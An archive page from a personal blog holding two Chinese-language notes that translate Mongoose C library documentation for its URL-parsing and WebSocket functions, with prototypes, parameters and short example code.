      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_url/" class="post-title-link" itemprop="url">mongoose_url</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose关于URL的函数</li>
</ul>
<h2 id="mg-url-port"><a href="#mg-url-port" class="headerlink" title="mg_url_port"></a>mg_url_port</h2><ul>
<li><p>简介：</p>
<ul>
<li>根据给定的URL返回端口</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">mg_url_port</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取端口号的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回给定URL的端口号</li>
<li>失败，如果URL不包含端口并且URL协议没有默认端口，则为0</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> port1 = <span class="built_in">mg_url_port</span>(<span class="string">&quot;https://myhost.com&quot;</span>) <span class="comment">// port1 is now 443 (default https port)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> port2 = <span class="built_in">mg_url_port</span>(<span class="string">&quot;127.0.0.1:567&quot;</span>) <span class="comment">// port2 is now 567</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-is-ssl"><a href="#mg-url-is-ssl" class="headerlink" title="mg_url_is_ssl"></a>mg_url_is_ssl</h2><ul>
<li><p>简介：</p>
<ul>
<li>检查给定的URL是否使用加密方案</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mg_url_is_ssl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要检查的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>如果URL使用了加密方案，返回0</li>
<li>如果没有，则返回非0</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">mg_url_is_ssl</span>(<span class="string">&quot;https://example.org&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// scheme is encrypted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-host"><a href="#mg-url-host" class="headerlink" title="mg_url_host"></a>mg_url_host</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取主机名。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_host</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 一个URL字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>主机名</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> a = <span class="built_in">mg_url_host</span>(<span class="string">&quot;https://my.example.org:1234&quot;</span>); <span class="comment">// a == &quot;my.example.org&quot;</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> b = <span class="built_in">mg_url_host</span>(<span class="string">&quot;tcp://[::1]&quot;</span>); <span class="comment">// b == &quot;[::1]&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-user"><a href="#mg-url-user" class="headerlink" title="mg_url_user"></a>mg_url_user</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取用户名。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_user</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取用户名的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回用户名</li>
<li>失败，返回空的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> user_name = <span class="built_in">mg_url_user</span>(<span class="string">&quot;https://user@password@my.example.org&quot;</span>); <span class="comment">// user_name is now &quot;user&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-pass"><a href="#mg-url-pass" class="headerlink" title="mg_url_pass"></a>mg_url_pass</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取密码</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_pass</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取密码的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回密码</li>
<li>失败，返回空的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> pwd = <span class="built_in">mg_url_user</span>(<span class="string">&quot;https://user@password@my.example.org&quot;</span>); <span class="comment">// pwd is now &quot;password&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-uri"><a href="#mg-url-uri" class="headerlink" title="mg_url_uri"></a>mg_url_uri</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取URI。注意，函数返回url内的指针；不需要明确地free()它。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">mg_url_uri</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取URI的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回URI字符串</li>
<li>失败，返回 <code>\</code></li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *uri = <span class="built_in">mg_url_uri</span>(<span class="string">&quot;https://example.org/subdir/subsubdir&quot;</span>); <span class="comment">// `uri` is now pointer to &quot;subdir/subsubdir&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_websocket/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_websocket/" class="post-title-link" itemprop="url">mongoose_websocket</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>websocket相关函数</li>
</ul>
<h2 id="struct-mg-ws-message"><a href="#struct-mg-ws-message" class="headerlink" title="struct mg_ws_message"></a>struct mg_ws_message</h2><ul>
<li><p>简介：</p>
<ul>
<li>该结构代表Websocket消息。这个<code>flag</code>元素对应于<code>RFC 6455</code>第5.2节中所述的第一个字节。(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.2</code>)</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_ws_message</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> data; <span class="comment">// WebSocket message data</span></span><br><span class="line">  <span class="type">uint8_t</span> flags;      <span class="comment">// WebSocket message flags</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="websocket-message-type"><a href="#websocket-message-type" class="headerlink" title="websocket message type"></a>websocket message type</h2><ul>
<li><p>简介：</p>
<ul>
<li>要从传入消息中提取消息类型，在结构体<code>mg_ws_message</code>的<code>flag</code>元素中检查四个<code>LSBs</code></li>
</ul>
</li>
<li><p>可能存在的WebSocket消息类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_CONTINUE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_TEXT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_BINARY 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_CLOSE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_PING 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_PONG 10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_WS_MSG) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_ws_message</span> *wm = (<span class="keyword">struct</span> mg_ws_message *) ev_data;</span><br><span class="line">    msgtype = wm-&gt;flags &amp; <span class="number">0x0F</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgtype == WEBSOCKET_OP_BINARY) &#123;</span><br><span class="line">      <span class="comment">// This is a binary data message</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msgtype == WEBSOCKET_OP_TEXT) &#123;</span><br><span class="line">      <span class="comment">// This is a text data message</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注：</p>
<ul>
<li>当调用<code>mg_ws_send()</code>或<code>ms_ws_printf()</code>发送消息时，请使用<code>RFC 6455</code>第5.6节中所述的正确消息类型进行数据帧(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.6</code>)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="mg-ws-connect"><a href="#mg-ws-connect" class="headerlink" title="mg_ws_connect"></a>mg_ws_connect</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建客户端Websocket连接。这个函数不能连接到对端，它仅仅分配需要的资源和启动连接进程。当对端真正连接好了，会向连接事件处理函数发送一个<code>MG_EV_CONNECT</code>事件</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_connection</span> *<span class="built_in">mg_ws_connect</span>(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data, <span class="type">const</span> <span class="type">char</span> *fmt, ...);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>url</code>  –  指定的远程URL。例如：<code>http://google.com</code></li>
<li><code>fn</code>   –  一个事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回一个指向创建的连接</li>
<li>返回NULL表示错误</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_connection</span> *c = <span class="built_in">mg_ws_connect</span>(&amp;mgr, <span class="string">&quot;ws://test_ws_server.com:1000&quot;</span>,</span><br><span class="line">                                        handler, <span class="literal">NULL</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Sec-WebSocket-Protocol: echo\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="literal">NULL</span>) <span class="built_in">fatal</span>(<span class="string">&quot;Cannot create connection&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-upgrade"><a href="#mg-ws-upgrade" class="headerlink" title="mg_ws_upgrade"></a>mg_ws_upgrade</h2><ul>
<li><p>简介：</p>
<ul>
<li>升级给定HTTP连接到Websocket。<code>fmt</code>是一个类似于<code>printf()</code>格式的字符串，用于额外的HTTP标头，返回给Websocket握手的客户端。如果不需要额外的标头，将<code>fmt</code>设置为空</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_ws_upgrade</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>    –  使用的连接</li>
<li><code>hm</code>   –  HTTP消息</li>
<li><code>fmt</code>  –  类似于<code>printf</code>的格式字符串，用于附加<code>HTTP</code>标头或为null</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_http_message</span> *hm = (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="built_in">mg_ws_upgrade</span>(c, hm, <span class="literal">NULL</span>);  <span class="comment">// Upgrade HTTP to WS</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-send"><a href="#mg-ws-send" class="headerlink" title="mg_ws_send"></a>mg_ws_send</h2><ul>
<li><p>简介：</p>
<ul>
<li>向WebSocket对端发送数据</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_send</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> op)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>buf</code>  –  需要发送的数据</li>
<li><code>len</code>  –  需要发送的数据大小</li>
<li><code>op</code>   –  WebSocket消息类型，参见WebSocket message type</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回发送的字节数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_WS_OPEN) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_http_message</span> *hm = (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="built_in">mg_ws_send</span>(c, <span class="string">&quot;opened&quot;</span>, <span class="number">6</span>, WEBSOCKET_OP_BINARY);  <span class="comment">// Send &quot;opened&quot; to web socket connection</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-printf-mg-ws-vprintf"><a href="#mg-ws-printf-mg-ws-vprintf" class="headerlink" title="mg_ws_printf, mg_ws_vprintf"></a>mg_ws_printf, mg_ws_vprintf</h2><ul>
<li><p>简介：</p>
<ul>
<li>和<code>ms_ws_send()</code>相同，但是使用<code>printf()</code>语义格式化数据</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_printf</span><span class="params">(<span class="keyword">struct</span> mg_connection *, <span class="type">int</span> op, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_vprintf</span><span class="params">(<span class="keyword">struct</span> mg_connection *, <span class="type">int</span> op, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>   –  使用的连接</li>
<li><code>op</code>  –  WebSocket消息类型，参见WebSocket message type</li>
<li><code>fmt</code> –  使用<code>printf()</code>语义格式化的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回发送的字节数</li>
</ul>
</li>
<li><p>示例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_ws_printf</span>(c, WEBSOCKET_OP_TEXT, <span class="string">&quot;Hello, %s!&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-wrap"><a href="#mg-ws-wrap" class="headerlink" title="mg_ws_wrap"></a>mg_ws_wrap</h2><ul>
<li><p>简介：</p>
<ul>
<li>将输出缓冲区中的数据转换为Websocket格式。有用然后通过WebSocket实施协议。具体示例参见<code>examples/mqtt-over-ws-client</code></li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_wrap</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">size_t</span> len, <span class="type">int</span> op)</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>len</code>  –  转换的字节数</li>
<li><code>op</code>   –  WebSocket消息类型</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回连接结构体中输出缓冲区新的大小</li>
</ul>
</li>
<li><p>示例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> len = c-&gt;send.len;         <span class="comment">// Store output buffer len</span></span><br><span class="line"><span class="built_in">mg_mqtt_login</span>(c, s_url, &amp;opts);   <span class="comment">// Write MQTT login message</span></span><br><span class="line"><span class="built_in">mg_ws_wrap</span>(c, c-&gt;send.len - len, WEBSOCKET_OP_BINARY); <span class="comment">// Wrap it into WS</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/30/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><span class="page-number current">31</span><a class="page-number" href="/page/32/">32</a><span class="space">&hellip;</span><a class="page-number" href="/page/35/">35</a><a class="extend next" rel="next" href="/page/32/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">zhang junyi</p>
  <div class="site-description" itemprop="description">工作学习笔记</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">686</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">99</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/junyiha" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;junyiha" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/zhangjunyiha" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;zhangjunyiha" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhang junyi</span>
</div>

<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>
-->

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
